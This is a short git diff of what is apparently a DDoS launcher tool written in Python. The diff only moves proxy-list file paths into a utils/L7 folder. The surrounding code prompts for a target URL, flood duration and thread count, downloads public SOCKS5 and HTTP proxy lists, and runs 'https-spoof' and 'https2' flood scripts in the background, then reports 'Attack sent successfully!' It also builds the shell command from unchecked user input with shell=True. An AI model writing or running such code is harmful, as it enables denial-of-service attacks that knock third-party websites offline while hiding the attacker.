@@ -585,7 +585,7 @@ class Tool:
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
 					F_Tool.styleText("\n [*] Downloading Proxy...\n")
-					with open("utils/socks5.txt", 'w') as p:
+					with open("utils/L7/socks5.txt", 'w') as p:
 						p.write(httpx.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text)
 					subprocess.run([f'screen -dm python3 utils/L7/https-spoof {url} {floodtime} {thread}'], shell=True)
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
@@ -597,7 +597,7 @@ class Tool:
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
 					F_Tool.styleText("\n [*] Downloading Proxy...\n")
-					with open("utils/http.txt", 'w') as p:
+					with open("utils/L7/http.txt", 'w') as p:
 						p.write(httpx.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all").text)
 					subprocess.run([f'screen -dm node utils/L7/https2 {url} {floodtime} {thread} http.txt'], shell=True)
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
